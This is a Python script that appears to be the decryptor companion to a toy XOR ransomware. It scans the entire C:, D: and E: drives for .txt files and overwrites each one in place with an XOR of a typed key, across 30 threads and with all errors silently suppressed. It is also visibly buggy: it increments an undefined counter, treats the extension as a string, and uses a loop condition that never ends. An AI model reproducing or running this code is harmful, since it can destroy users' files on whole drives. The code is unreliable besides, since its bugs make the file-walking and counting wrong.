import os
# import string
# import random
# import socket
# from datetime import datetime
from threading import Thread
from queue import Queue

No_of_decrypt = 0

#file extensions to decrypt
decrypted_extensions = ('.txt')

decryption_level = 128 // 8
key = input("Enter Key : ")

# grab all files from the machine
file_paths = []
for root,dirs,files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext =  os.path.splitext(root+'\\'+file)
        if file_ext in decrypted_extensions:
            file_paths.append(root+'\\'+file)
try :
    for root,dirs,files in os.walk('D:\\'):
        for file in files:
            file_path, file_ext =  os.path.splitext(root+'\\'+file)
            if file_ext in decrypted_extensions:
                file_paths.append(root+'\\'+file)
except:
    pass
try :
    for root,dirs,files in os.walk('E:\\'):
        for file in files:
            file_path, file_ext =  os.path.splitext(root+'\\'+file)
            if file_ext in decrypted_extensions:
                file_paths.append(root+'\\'+file)
except:
    pass

#Decrypt Files
def decrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = decryption_level - 1
        try:
            with open(file,'rb') as f:
                data = f.read()
            with open(file,'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
            print(f'Decrypted {file}')
            No_of_encrypt += 1
        except:
            # print(f'Failed to encrypt {file}')
            pass
        q.task_done()



# Multi Threading
q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=decrypt, args=(key,), daemon=True)
    thread.start()



q.join()
print('Decryption Successful.')
print(f'No of Successful Decryptions : {No_of_decrypt}')

input()